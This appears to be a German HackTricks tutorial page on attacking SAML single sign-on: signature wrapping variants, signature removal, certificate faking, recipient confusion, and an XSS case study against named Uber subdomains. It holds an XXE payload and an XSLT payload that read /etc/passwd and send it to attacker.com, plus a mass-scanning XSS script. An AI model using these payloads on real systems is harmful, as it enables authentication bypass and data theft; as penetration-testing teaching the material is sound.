# SAML-Angriffe

## SAML-Angriffe

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

{{#ref}}
saml-basics.md
{{#endref}}

## Werkzeug

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor): Ein Werkzeug, das eine URL oder eine Liste von URLs aufnehmen und die SAML-Verbrauchs-URL zurückgeben kann.

## XML-Rundreise

Im XML wird der signierte Teil des XML im Speicher gespeichert, dann wird eine gewisse Kodierung/Dekodierung durchgeführt und die Signatur wird überprüft. Idealerweise sollte diese Kodierung/Dekodierung die Daten nicht verändern, aber basierend auf diesem Szenario **könnten die überprüften Daten und die ursprünglichen Daten nicht identisch sein**.

Zum Beispiel, überprüfen Sie den folgenden Code:
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
Das Ausführen des Programms gegen REXML 3.2.4 oder früher würde stattdessen die folgende Ausgabe ergeben:
```
First child in original doc: Y
First child after round-trip: Z
```
So sah das REXML-Dokument aus dem obigen Programm aus:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../images/image (1001).png>)

Und so sah es nach einer Runde Parsing und Serialisierung aus:

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../images/image (445).png>)

Für weitere Informationen über die Schwachstelle und wie man sie ausnutzen kann:

- [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
- [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XML Signature Wrapping Angriffe

Bei **XML Signature Wrapping Angriffen (XSW)** nutzen Angreifer eine Schwachstelle aus, die auftritt, wenn XML-Dokumente in zwei verschiedenen Phasen verarbeitet werden: **Signaturvalidierung** und **Funktionsaufruf**. Diese Angriffe beinhalten die Veränderung der XML-Dokumentstruktur. Konkret **injiziert der Angreifer gefälschte Elemente**, die die Gültigkeit der XML-Signatur nicht beeinträchtigen. Diese Manipulation zielt darauf ab, eine Diskrepanz zwischen den von der **Anwendungslogik** analysierten Elementen und den von dem **Signaturprüfmodul** überprüften Elementen zu schaffen. Infolgedessen bleibt die XML-Signatur technisch gültig und besteht die Überprüfung, während die Anwendungslogik die **betrügerischen Elemente** verarbeitet. Folglich umgeht der Angreifer effektiv den **Integritätsschutz** und die **Ursprungsauthentifizierung** der XML-Signatur, was die **Einspeisung beliebiger Inhalte** ohne Erkennung ermöglicht.

Die folgenden Angriffe basieren auf [**diesem Blogbeitrag**](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **und** [**diesem Papier**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf). Überprüfen Sie diese für weitere Details.

### XSW #1

- **Strategie**: Ein neues Root-Element, das die Signatur enthält, wird hinzugefügt.
- **Implikation**: Der Validator könnte zwischen dem legitimen "Response -> Assertion -> Subject" und dem "bösen neuen Response -> Assertion -> Subject" des Angreifers verwirrt werden, was zu Datenintegritätsproblemen führt.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../images/image (506).png>)

### XSW #2

- **Unterschied zu XSW #1**: Verwendet eine abgetrennte Signatur anstelle einer umschließenden Signatur.
- **Implikation**: Die "böse" Struktur, ähnlich wie bei XSW #1, zielt darauf ab, die Geschäftslogik nach der Integritätsprüfung zu täuschen.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../images/image (466).png>)

### XSW #3

- **Strategie**: Eine böse Assertion wird auf derselben Hierarchieebene wie die ursprüngliche Assertion erstellt.
- **Implikation**: Zielt darauf ab, die Geschäftslogik zu verwirren, damit sie die bösartigen Daten verwendet.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../images/image (120).png>)

### XSW #4

- **Unterschied zu XSW #3**: Die ursprüngliche Assertion wird ein Kind der duplizierten (bösen) Assertion.
- **Implikation**: Ähnlich wie bei XSW #3, aber verändert die XML-Struktur aggressiver.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../images/image (551).png>)

### XSW #5

- **Einzigartiger Aspekt**: Weder die Signatur noch die ursprüngliche Assertion entsprechen den Standardkonfigurationen (umschlossen/umschließend/abgetrennt).
- **Implikation**: Die kopierte Assertion umschließt die Signatur und verändert die erwartete Dokumentstruktur.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../images/image (1030).png>)

### XSW #6

- **Strategie**: Ähnliche Standorteinfügung wie XSW #4 und #5, aber mit einer Wendung.
- **Implikation**: Die kopierte Assertion umschließt die Signatur, die dann die ursprüngliche Assertion umschließt, wodurch eine verschachtelte täuschende Struktur entsteht.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../images/image (169).png>)

### XSW #7

- **Strategie**: Ein Extensions-Element wird eingefügt, wobei die kopierte Assertion ein Kind ist.
- **Implikation**: Dies nutzt das weniger restriktive Schema des Extensions-Elements aus, um Schema-Validierungsmaßnahmen zu umgehen, insbesondere in Bibliotheken wie OpenSAML.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../images/image (971).png>)

### XSW #8

- **Unterschied zu XSW #7**: Verwendet ein anderes weniger restriktives XML-Element für eine Variante des Angriffs.
- **Implikation**: Die ursprüngliche Assertion wird ein Kind des weniger restriktiven Elements, wodurch die Struktur umgekehrt wird, die in XSW #7 verwendet wurde.

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../images/image (541).png>)

### Tool

Sie können die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden, um die Anfrage zu parsen, einen beliebigen XSW-Angriff anzuwenden, den Sie wählen, und ihn zu starten.

## XXE

Wenn Sie nicht wissen, welche Art von Angriffen XXE sind, lesen Sie bitte die folgende Seite:

{{#ref}}
../xxe-xee-xml-external-entity.md
{{#endref}}

SAML-Antworten sind **deflatiertes und base64-kodiertes XML-Dokumente** und können anfällig für XML External Entity (XXE) Angriffe sein. Durch die Manipulation der XML-Struktur der SAML-Antwort können Angreifer versuchen, XXE-Schwachstellen auszunutzen. So kann ein solcher Angriff visualisiert werden:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Tools

Sie können auch die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden, um den POC aus einer SAML-Anfrage zu generieren, um mögliche XXE-Schwachstellen und SAML-Schwachstellen zu testen.

Überprüfen Sie auch diesen Vortrag: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT über SAML

Für weitere Informationen zu XSLT gehen Sie zu:

{{#ref}}
../xslt-server-side-injection-extensible-stylesheet-language-transformations.md
{{#endref}}

Extensible Stylesheet Language Transformations (XSLT) können verwendet werden, um XML-Dokumente in verschiedene Formate wie HTML, JSON oder PDF zu transformieren. Es ist wichtig zu beachten, dass **XSLT-Transformationen vor der Überprüfung der digitalen Signatur durchgeführt werden**. Das bedeutet, dass ein Angriff erfolgreich sein kann, selbst ohne eine gültige Signatur; eine selbstsignierte oder ungültige Signatur reicht aus, um fortzufahren.

Hier finden Sie einen **POC**, um nach dieser Art von Schwachstellen zu suchen. Auf der Hacktricks-Seite, die zu Beginn dieses Abschnitts erwähnt wurde, finden Sie Payloads.
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Tool

Sie können auch die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden, um das POC aus einer SAML-Anfrage zu generieren, um mögliche XSLT-Schwachstellen zu testen.

Überprüfen Sie auch diesen Vortrag: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Signature Exclusion <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

Die **XML Signature Exclusion** beobachtet das Verhalten von SAML-Implementierungen, wenn das Signature-Element nicht vorhanden ist. Wenn dieses Element fehlt, **kann die Signaturvalidierung nicht erfolgen**, was es anfällig macht. Es ist möglich, dies zu testen, indem die Inhalte geändert werden, die normalerweise von der Signatur überprüft werden.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../images/image (457).png>)

### Tool <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

Sie können auch die Burp-Erweiterung [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) verwenden. Fangen Sie die SAML-Antwort ab und klicken Sie auf `Remove Signatures`. Dabei werden **alle** Signature-Elemente entfernt.

Nachdem die Signaturen entfernt wurden, lassen Sie die Anfrage an das Ziel weitergehen. Wenn die Signatur vom Dienst nicht benötigt wird.

## Certificate Faking <a href="#certificate-faking" id="certificate-faking"></a>

## Certificate Faking

Certificate Faking ist eine Technik, um zu testen, ob ein **Service Provider (SP) ordnungsgemäß überprüft, dass eine SAML-Nachricht von einem vertrauenswürdigen Identity Provider (IdP) signiert ist**. Es beinhaltet die Verwendung eines \***selbstsignierten Zertifikats**, um die SAML-Antwort oder -Assertion zu signieren, was hilft, den Vertrauensvalidierungsprozess zwischen SP und IdP zu bewerten.

### How to Conduct Certificate Faking

Die folgenden Schritte skizzieren den Prozess unter Verwendung der [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp-Erweiterung:

1. Fangen Sie die SAML-Antwort ab.
2. Wenn die Antwort eine Signatur enthält, senden Sie das Zertifikat an SAML Raider Certs, indem Sie die Schaltfläche `Send Certificate to SAML Raider Certs` verwenden.
3. Wählen Sie im SAML Raider Certificates-Tab das importierte Zertifikat aus und klicken Sie auf `Save and Self-Sign`, um eine selbstsignierte Kopie des ursprünglichen Zertifikats zu erstellen.
4. Gehen Sie zurück zur abgefangenen Anfrage im Burp-Proxy. Wählen Sie das neue selbstsignierte Zertifikat aus dem Dropdown-Menü für die XML-Signatur aus.
5. Entfernen Sie vorhandene Signaturen mit der Schaltfläche `Remove Signatures`.
6. Signieren Sie die Nachricht oder Assertion mit dem neuen Zertifikat, indem Sie die Schaltfläche **`(Re-)Sign Message`** oder **`(Re-)Sign Assertion`** verwenden, je nach Bedarf.
7. Leiten Sie die signierte Nachricht weiter. Eine erfolgreiche Authentifizierung zeigt an, dass der SP Nachrichten akzeptiert, die mit Ihrem selbstsignierten Zertifikat signiert sind, was potenzielle Schwachstellen im Validierungsprozess der SAML-Nachrichten offenbart.

## Token Recipient Confusion / Service Provider Target Confusion <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token Recipient Confusion und Service Provider Target Confusion beinhalten die Überprüfung, ob der **Service Provider den beabsichtigten Empfänger einer Antwort korrekt validiert**. Im Wesentlichen sollte ein Service Provider eine Authentifizierungsantwort ablehnen, wenn sie für einen anderen Anbieter bestimmt war. Das entscheidende Element hier ist das **Recipient**-Feld, das sich im **SubjectConfirmationData**-Element einer SAML-Antwort befindet. Dieses Feld gibt eine URL an, die angibt, wo die Assertion gesendet werden muss. Wenn der tatsächliche Empfänger nicht mit dem beabsichtigten Service Provider übereinstimmt, sollte die Assertion als ungültig angesehen werden.

#### **How It Works**

Damit ein SAML Token Recipient Confusion (SAML-TRC)-Angriff durchführbar ist, müssen bestimmte Bedingungen erfüllt sein. Erstens muss es ein gültiges Konto bei einem Service Provider (als SP-Legit bezeichnet) geben. Zweitens muss der angegriffene Service Provider (SP-Target) Tokens vom selben Identity Provider akzeptieren, der SP-Legit bedient.

Der Angriffsprozess ist unter diesen Bedingungen unkompliziert. Eine authentische Sitzung wird mit SP-Legit über den gemeinsamen Identity Provider initiiert. Die SAML-Antwort vom Identity Provider an SP-Legit wird abgefangen. Diese abgefangene SAML-Antwort, die ursprünglich für SP-Legit bestimmt war, wird dann an SP-Target umgeleitet. Der Erfolg dieses Angriffs wird daran gemessen, dass SP-Target die Assertion akzeptiert und den Zugriff auf Ressourcen unter demselben Kontonamen gewährt, der für SP-Legit verwendet wurde.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS in Logout-Funktionalität

Die ursprüngliche Forschung kann über [diesen Link](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/) aufgerufen werden.

Während des Verzeichniss-Brute-Forcings wurde eine Logout-Seite entdeckt unter:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
Beim Zugriff auf diesen Link kam es zu einer Weiterleitung zu:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
Dies zeigte, dass der `base`-Parameter eine URL akzeptiert. In Anbetracht dessen entstand die Idee, die URL durch `javascript:alert(123);` zu ersetzen, um einen XSS (Cross-Site Scripting) Angriff zu initiieren.

### Massenexploitation

[Aus dieser Forschung](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

Das [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) Tool wurde verwendet, um Subdomains von `uberinternal.com` für Domains zu analysieren, die dieselbe Bibliothek nutzen. Anschließend wurde ein Skript entwickelt, um die `oidauth/prompt`-Seite anzugreifen. Dieses Skript testet auf XSS (Cross-Site Scripting), indem es Daten eingibt und überprüft, ob sie in der Ausgabe reflektiert werden. In Fällen, in denen die Eingabe tatsächlich reflektiert wird, kennzeichnet das Skript die Seite als anfällig.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## Referenzen

- [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
- [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
- [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
- [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

{{#include ../../banners/hacktricks-training.md}}
